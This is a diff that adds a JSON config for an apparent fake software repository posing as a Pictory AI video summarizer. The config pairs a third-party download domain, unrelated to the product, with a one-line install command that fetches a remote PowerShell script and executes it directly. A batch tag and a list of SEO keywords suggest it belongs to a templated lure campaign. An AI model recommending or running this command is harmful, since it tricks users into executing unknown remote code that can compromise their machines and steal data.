@@ -1,0 +1,29 @@
+{
+  "repo": "pictory-ai-long-form-video-summarizer",
+  "product": "Pictory AI Long-Form Video Summarizer",
+  "kind": "video",
+  "install_type": "download",
+  "download_url": "https://pictory.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "video",
+  "topics": [
+    "pictory-studio",
+    "pictory-client",
+    "pictory-video-recorder",
+    "pictory-win11",
+    "pictory-error-fix",
+    "run-pictory-on-windows",
+    "pictory-live-streaming",
+    "pictory-desktop-tool",
+    "pictory-configure-guide",
+    "pictory-build-2026",
+    "pictory-setup-package",
+    "desktop-tools",
+    "content-creation",
+    "setup-guide",
+    "streaming-tools"
+  ]
+}
